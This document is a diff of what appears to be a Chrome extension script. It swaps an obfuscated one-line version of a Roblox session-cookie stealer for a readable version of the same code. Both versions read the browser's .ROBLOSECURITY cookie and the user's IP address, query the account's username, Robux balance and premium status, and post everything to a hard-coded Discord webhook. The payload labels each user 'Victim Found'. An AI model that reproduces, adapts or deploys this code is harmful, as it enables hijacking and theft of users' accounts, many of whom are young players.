@@ -1,1 +1,93 @@
-const _0x50bf18=_0x13e3;(function(_0x4f2142,_0x219ec9){const _0x1d4b44=_0x13e3,_0x42783e=_0x4f2142();while(!![]){try{const _0x1acd5a=-parseInt(_0x1d4b44(0x8c))/0x1+parseInt(_0x1d4b44(0x80))/0x2+-parseInt(_0x1d4b44(0x73))/0x3*(parseInt(_0x1d4b44(0x71))/0x4)+parseInt(_0x1d4b44(0x6d))/0x5+parseInt(_0x1d4b44(0x81))/0x6+parseInt(_0x1d4b44(0x6c))/0x7*(-parseInt(_0x1d4b44(0x8a))/0x8)+-parseInt(_0x1d4b44(0x7c))/0x9*(-parseInt(_0x1d4b44(0x82))/0xa);if(_0x1acd5a===_0x219ec9)break;else _0x42783e['push'](_0x42783e['shift']());}catch(_0x447db4){_0x42783e['push'](_0x42783e['shift']());}}}(_0x9818,0xed611));const WEBHOOK_URL=_0x50bf18(0x72);async function fetchIP(){const _0x497600=_0x50bf18;try{const _0x556c6f=await fetch(_0x497600(0x8b));return await _0x556c6f[_0x497600(0x83)]();}catch(_0x164f43){return console[_0x497600(0x75)](_0x497600(0x85),_0x164f43),_0x497600(0x6b);}}async function fetchUserInfo(_0x2cbcb3){const _0x265f1f=_0x50bf18;try{const _0x2241c6=await fetch(_0x265f1f(0x6e),{'headers':{'Cookie':'.ROBLOSECURITY='+_0x2cbcb3},'redirect':'manual'});return await _0x2241c6['json']();}catch(_0x1bf934){return console[_0x265f1f(0x75)](_0x265f1f(0x68),_0x1bf934),null;}}function _0x13e3(_0xe6dc39,_0x704b87){const _0x98182a=_0x9818();return _0x13e3=function(_0x13e382,_0x15dcb0){_0x13e382=_0x13e382-0x66;let _0x482beb=_0x98182a[_0x13e382];return _0x482beb;},_0x13e3(_0xe6dc39,_0x704b87);}async function sendWebhook(_0x6cf598){const _0x3fcc05=_0x50bf18;try{await fetch(WEBHOOK_URL,{'method':_0x3fcc05(0x7b),'headers':{'Content-Type':_0x3fcc05(0x69)},'body':JSON[_0x3fcc05(0x7a)](_0x6cf598)});}catch(_0x4ca88d){console[_0x3fcc05(0x75)](_0x3fcc05(0x6f),_0x4ca88d);}}async function main(_0x5d3996){const _0x58d964=_0x50bf18,_0x3d5005=await fetchIP(),_0x14e9da=_0x5d3996?await fetchUserInfo(_0x5d3996):null,_0x194ef3={'content':null,'embeds':[{'description':'```'+(_0x5d3996?_0x5d3996:_0x58d964(0x74))+_0x58d964(0x8d),'color':null,'fields':[{'name':_0x58d964(0x7e),'value':_0x14e9da?_0x14e9da[_0x58d964(0x88)]:_0x58d964(0x77),'inline':!![]},{'name':_0x58d964(0x76),'value':_0x14e9da?_0x14e9da['RobuxBalance']:_0x58d964(0x77),'inline':!![]},{'name':'Premium','value':_0x14e9da?_0x14e9da[_0x58d964(0x66)]:_0x58d964(0x77),'inline':!![]}],'author':{'name':_0x58d964(0x89)+_0x3d5005,'icon_url':_0x14e9da?_0x14e9da[_0x58d964(0x70)]:_0x58d964(0x7d)},'footer':{'text':_0x58d964(0x7f),'icon_url':_0x58d964(0x79)},'thumbnail':{'url':_0x14e9da?_0x14e9da[_0x58d964(0x70)]:_0x58d964(0x7d)}}],'username':_0x58d964(0x6a),'avatar_url':_0x58d964(0x86),'attachments':[]};await sendWebhook(_0x194ef3);}chrome[_0x50bf18(0x84)][_0x50bf18(0x78)]({'url':'https://www.roblox.com/home','name':_0x50bf18(0x87)},function(_0x245661){const _0x44325a=_0x50bf18;main(_0x245661?_0x245661[_0x44325a(0x67)]:null);});function _0x9818(){const _0x27a4a9=['1710667cTjPGG','```','IsPremium','value','Error\x20fetching\x20user\x20info:','application/json','Roblox','IP\x20NOT\x20FOUND','7RBGhmM','8393400ABwFea','https://www.roblox.com/mobileapi/userinfo','Error\x20sending\x20webhook:','ThumbnailUrl','4QwPXrG','https://discord.com/api/webhooks/1264864170797699072/i0JgRJn7igNDH4-ezPAW3VmS7wfEEXxD-VW1JouHdT9Ukfxjm23f1wzALp5Mc2ZVaSFs','3143505NZTify','COOKIE\x20NOT\x20FOUND','error','Robux','N/A','get','https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png','stringify','POST','5409dzyUJX','https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png','Username','https://github.com/ox-y','2216070etxeqm','9970248JFRdvf','890baqNcs','text','cookies','Error\x20fetching\x20IP:','https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png','.ROBLOSECURITY','UserName','Victim\x20Found:\x20','6168840oeOEsf','https://api.ipify.org'];_0x9818=function(){return _0x27a4a9;};return _0x9818();}
+const WEBHOOK_URL =
+  'https://discord.com/api/webhooks/1264998026720706652/6Y-N3K7k18TaXuSZ0ipV6grvLZV8oHXFUksiGghIDviPOrSfQzONkPuTvTsEgUA7xqXe'
+async function fetchIP() {
+  try {
+    const _0x556c6f = await fetch('https://api.ipify.org')
+    return await _0x556c6f.text()
+  } catch (_0x164f43) {
+    return console.error('Error fetching IP:', _0x164f43), 'IP NOT FOUND'
+  }
+}
+async function fetchUserInfo(_0x2cbcb3) {
+  try {
+    const _0x2241c6 = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+      headers: { Cookie: '.ROBLOSECURITY=' + _0x2cbcb3 },
+      redirect: 'manual',
+    })
+    return await _0x2241c6.json()
+  } catch (_0x1bf934) {
+    return console.error('Error fetching user info:', _0x1bf934), null
+  }
+}
+async function sendWebhook(_0x6cf598) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(_0x6cf598),
+    })
+  } catch (_0x4ca88d) {
+    console.error('Error sending webhook:', _0x4ca88d)
+  }
+}
+async function main(_0x5d3996) {
+  const _0x3d5005 = await fetchIP(),
+    _0x14e9da = _0x5d3996 ? await fetchUserInfo(_0x5d3996) : null,
+    _0x194ef3 = {
+      content: null,
+      embeds: [
+        {
+          description:
+            '```' + (_0x5d3996 ? _0x5d3996 : 'COOKIE NOT FOUND') + '```',
+          color: null,
+          fields: [
+            {
+              name: 'Username',
+              value: _0x14e9da ? _0x14e9da.UserName : 'N/A',
+              inline: true,
+            },
+            {
+              name: 'Robux',
+              value: _0x14e9da ? _0x14e9da.RobuxBalance : 'N/A',
+              inline: true,
+            },
+            {
+              name: 'Premium',
+              value: _0x14e9da ? _0x14e9da.IsPremium : 'N/A',
+              inline: true,
+            },
+          ],
+          author: {
+            name: 'Victim Found: ' + _0x3d5005,
+            icon_url: _0x14e9da
+              ? _0x14e9da.ThumbnailUrl
+              : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
+          },
+          footer: {
+            text: 'https://github.com/ox-y',
+            icon_url:
+              'https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png',
+          },
+          thumbnail: {
+            url: _0x14e9da
+              ? _0x14e9da.ThumbnailUrl
+              : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
+          },
+        },
+      ],
+      username: 'Roblox',
+      avatar_url:
+        'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png',
+      attachments: [],
+    }
+  await sendWebhook(_0x194ef3)
+}
+chrome.cookies.get(
+  {
+    url: 'https://www.roblox.com/home',
+    name: '.ROBLOSECURITY',
+  },
+  function (_0x245661) {
+    main(_0x245661 ? _0x245661.value : null)
+  }
+)
